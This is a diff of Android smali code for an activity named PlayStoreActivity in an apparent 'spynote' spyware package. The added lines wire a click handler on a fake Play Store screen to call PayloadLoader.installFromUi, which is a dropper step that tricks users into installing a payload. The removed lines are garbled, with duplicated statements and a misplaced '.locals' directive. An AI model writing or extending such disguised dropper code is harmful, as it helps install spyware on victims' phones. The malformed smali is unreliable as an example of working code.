@@ -1,5 +1,6 @@
 .class public Lorg/spynote/PlayStoreActivity;
 .super Landroid/app/Activity;
+.implements Landroid/view/View$OnClickListener;
 .source "PlayStoreActivity.java"
 
 
@@ -15,33 +16,22 @@
 
     invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
 
-    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getResources()Landroid/content/res/Resources;
+    const v0, 0x7f030001
+    invoke-virtual {p0, v0}, Lorg/spynote/PlayStoreActivity;->setContentView(I)V
+
+    const v0, 0x7f070001
+    invoke-virtual {p0, v0}, Lorg/spynote/PlayStoreActivity;->findViewById(I)Landroid/view/View;
     move-result-object v0
-    const-string v1, "activity_dropper"
-    const-string p1, "layout"
-    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getPackageName()Ljava/lang/String;
-    move-result-object p0
-    invoke-virtual {v0, v1, p1, p0}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
-    move-result v0
-    if-lez v0, :skip_layout
-    .locals 3
+    if-eqz v0, :done
+    invoke-virtual {v0, p0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V
+
+    :done
+    return-void
+.end method
 
 
-
-    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-
-
-
-    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getResources()Landroid/content/res/Resources;
-
-    move-result-object v0
-
-    const-string v1, "activity_dropper"
-
-    const-string v2, "layout"
-
-    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getPackageName()Ljava/lang/String;
-
-    move-result-object p1
-
-    invoke-virtual {v0, v1, v2, p1}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
+.method public onClick(Landroid/view/View;)V
+    .locals 0
+    invoke-static {p0}, Lorg/spynote/PayloadLoader;->installFromUi(Landroid/content/Context;)V
+    return-void
+.end method
